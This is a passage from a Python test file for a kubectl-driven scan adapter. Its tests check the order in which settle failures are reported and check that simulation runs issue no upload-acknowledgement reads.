        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
        before_teardown=lambda records: responded.append(True),
    )
    assert not result.succeeded
    assert result.error is not None and result.error.startswith("settle failed: ApplyError")
    assert match in result.error
    assert responded == [True], "settle runs before the response phase, so the failure precedes it"
    assert any(SCAN_SELECTOR in argv and "job" in argv for argv, _ in runner.calls)


def test_a_non_cve_plan_never_reads_an_upload_acknowledgement(tmp_path: Path) -> None:
    """The acknowledgement read is reachable only from a scan; a SIM run issues no such command."""
    runner = ScanJobRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-NONE-101")
    adapter.settle()
    assert runner.upload_reads == []
